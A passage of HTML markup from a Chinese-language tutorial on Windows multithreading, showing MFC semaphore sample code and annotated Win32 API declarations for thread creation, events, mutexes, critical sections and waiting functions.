class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b58374268334-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b58374268334-31\">31</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-1\"><span class=\"crayon-e \">Csemaphore *</span><span class=\"crayon-v\">semaphore</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-2\"><span class=\"crayon-v\">Semaphore</span><span class=\"crayon-o\">=</span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Csemaphore</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-3\"><span class=\"crayon-e\">HWND </span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-o\">=</span><span class=\"crayon-e\">GetSafeHwnd</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-4\"><span class=\"crayon-e\">AfxBeginThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadProc1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-5\"><span class=\"crayon-e\">AfxBeginThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadProc2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-6\"><span class=\"crayon-e\">AfxBeginThread</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">threadProc3</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">hWnd</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-7\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadProc1</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-8\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-9\">　<span class=\"crayon-e\">CsingleLock </span><span class=\"crayon-e\">singelLock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">semaphore</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-10\">　<span class=\"crayon-v\">singleLock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-11\">　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-12\">　<span class=\"crayon-o\">::</span><span class=\"crayon-e\">MessageBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">HWND</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread1 had access\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread1\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">MB_OK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-13\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-14\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-15\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadProc2</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-16\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-17\">　<span class=\"crayon-e\">CSingleLock </span><span class=\"crayon-e\">singelLock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">semaphore</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-18\">　<span class=\"crayon-v\">singleLock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-19\">　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-20\">　<span class=\"crayon-o\">::</span><span class=\"crayon-e\">MessageBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">HWND</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread2 had access\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread2\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">MB_OK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-21\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-22\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-24\"><span class=\"crayon-e\">UINT </span><span class=\"crayon-e\">ThreadProc3</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-25\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-26\">　<span class=\"crayon-e\">CsingleLock </span><span class=\"crayon-e\">singelLock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">semaphore</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-27\">　<span class=\"crayon-v\">singleLock</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">Lock</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-28\">　<span class=\"crayon-e\">Sleep</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">10000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-29\">　<span class=\"crayon-o\">::</span><span class=\"crayon-e\">MessageBox</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">HWND</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">param</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread3 had access\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">\"Thread3\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">MB_OK</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b58374268334-30\">　<span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b58374268334-31\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0037 seconds] -->\r\n<p></p>\n<h1>二、 编程步骤</h1>\n<ol>\n<li>启动Visual C++6.0，生成一个32位的控制台程序，将该程序命名为”sequence”</li>\n<li>输入要排续的数字，声明四个子线程；</li>\n<li>输入代码，编译运行程序。</li>\n</ol>\n<h1>三、 程序代码</h1>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b5c876967460\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsequence.cpp : Defines the entry point for the console application.</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b5c876967460-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b5c876967460-1\"><span class=\"crayon-v\">sequence</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">cpp</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Defines </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">entry </span><span class=\"crayon-e\">point </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">console </span><span class=\"crayon-v\">application</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>主要用到的WINAPI线程控制函数，有关详细说明请查看MSDN；</p>\n<p>线程建立函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b5f834680627\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHANDLE CreateThread(\r\n　LPSECURITY_ATTRIBUTES lpThreadAttributes, // 安全属性结构指针，可为NULL；\r\n　DWORD dwStackSize, // 线程栈大小，若为0表示使用默认值； \r\n　LPTHREAD_START_ROUTINE lpStartAddress, // 指向线程函数的指针；\r\n　LPVOID lpParameter, // 传递给线程函数的参数，可以保存一个指针值； \r\n　DWORD dwCreationFlags, // 线程建立是的初始标记，运行或挂起； \r\n　LPDWORD lpThreadId // 指向接收线程号的DWORD变量； \r\n);</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b5f834680627-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b5f834680627-1\"><span class=\"crayon-e\">HANDLE </span><span class=\"crayon-e\">CreateThread</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b5f834680627-2\">　<span class=\"crayon-e\">LPSECURITY_ATTRIBUTES </span><span class=\"crayon-v\">lpThreadAttributes</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 安全属性结构指针，可为NULL；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b5f834680627-3\">　<span class=\"crayon-e\">DWORD </span><span class=\"crayon-v\">dwStackSize</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 线程栈大小，若为0表示使用默认值； </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b5f834680627-4\">　<span class=\"crayon-e\">LPTHREAD_START_ROUTINE </span><span class=\"crayon-v\">lpStartAddress</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 指向线程函数的指针；</span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b5f834680627-5\">　<span class=\"crayon-e\">LPVOID </span><span class=\"crayon-v\">lpParameter</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 传递给线程函数的参数，可以保存一个指针值； </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b5f834680627-6\">　<span class=\"crayon-e\">DWORD </span><span class=\"crayon-v\">dwCreationFlags</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 线程建立是的初始标记，运行或挂起； </span></div><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b5f834680627-7\">　<span class=\"crayon-e\">LPDWORD </span><span class=\"crayon-v\">lpThreadId</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// 指向接收线程号的DWORD变量； </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b5f834680627-8\"><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>对临界资源控制的多线程控制的信号函数：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f3a4d88b62911088268\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nHANDLE CreateEvent(\r\n　LPSECURITY_ATTRIBUTES lpEventAttributes, // 安全属性结构指针，可为NULL；\r\n　BOOL bManualReset, // 手动清除信号标记，TRUE在WaitForSingleObject后必须手动//调用RetEvent清除信号。若为　FALSE则在WaitForSingleObject\r\n　//后，系统自动清除事件信号；\r\n　BOOL bInitialState, // 初始状态，TRUE有信号，FALSE无信号；\r\n　LPCTSTR lpName // 信号量的名称，字符数不可多于MAX_PATH；\r\n　//如果遇到同名的其他信号量函数就会失败，如果遇\r\n　//到同类信号同名也要注意变化；\r\n);\r\n\r\nHANDLE CreateMutex(\r\n　LPSECURITY_ATTRIBUTES lpMutexAttributes, // 安全属性结构指针，可为NULL\r\n　BOOL bInitialOwner, // 当前建立互斥量是否占有该互斥量TRUE表示占有，\r\n　//这样其他线程就不能获得此互斥量也就无法进入由\r\n　//该互斥量控制的临界区。FALSE表示不占有该互斥量 \r\n　LPCTSTR lpName // 信号量的名称，字符数不可多于MAX_PATH如果\r\n　//遇到同名的其他信号量函数就会失败，\r\n　//如果遇到同类信号同名也要注意变化；\r\n);\r\n\r\n//初始化临界区信号，使用前必须先初始化\r\nVOID InitializeCriticalSection(\r\n　LPCRITICAL_SECTION lpCriticalSection // 临界区变量指针\r\n);\r\n\r\n//阻塞函数\r\n//如果等待的信号量不可用，那么线程就会挂起，直到信号可用\r\n//线程才会被唤醒，该函数会自动修改信号，如Event，线程被唤醒之后\r\n//Event信号会变得无信号，Mutex、Semaphore等也会变。\r\nDWORD WaitForSingleObject(\r\n　HANDLE hHandle, // 等待对象的句柄\r\n　DWORD dwMilliseconds // 等待毫秒数，INFINITE表示无限等待\r\n);\r\n//如果要等待多个信号可以使用WaitForMutipleObject函数\r\n*/</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f3a4d88b62911088268-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a6f3a4d88b62911088268-35\">35</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f3a4d88b62911088268-1\"><span class=\"crayon-e\">HANDLE </span><span class=\"crayon-e\">CreateEvent</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f3a4d88b62911088268-2\">　